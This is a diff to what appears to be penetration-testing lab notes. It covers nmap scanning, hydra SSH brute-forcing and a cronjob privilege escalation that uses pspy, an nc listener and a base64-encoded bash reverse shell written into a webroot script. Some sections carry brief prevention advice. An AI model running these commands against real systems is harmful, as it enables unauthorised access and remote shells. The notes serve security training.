@@ -1,5 +1,6 @@
 ### Nmap Scanning
 ```bash
+cd /home/kali/ela/linux
 target=10.5.20.12
 nmap -sSV -p- -Pn -n -O $target -T3
 ```
@@ -47,7 +48,7 @@ ideally MFA, CAPTCHA, WAF
 
 ### SSH Bruteforce
 ```bash
-hydra -vV -L ./ssh_users.txt -P /usr/share/nmap/nselib/data/passwords.lst ssh://$target
+hydra -L ./ssh_users.txt -P /usr/share/nmap/nselib/data/passwords.lst ssh://$target
 ```
 #### Prevention
 first thing you always do is harden ssh sshd_config on a new machine
@@ -117,6 +118,7 @@ bash -c 'echo "<base64...>" | base64 -d > /usr/local/apache2/htdocs/js/captcha.j
 
 ### Cronjob Priviledge Escalation
 ```bash
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64; chmod +x ./pspy64; ./pspy64
 nc -lvnp 1337
 echo 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC41LjMwLjUwLzEzMzcgMD4mMQ== | base64 -d | bash' > /usr/local/apache2/htdocs/exploit.sh
 
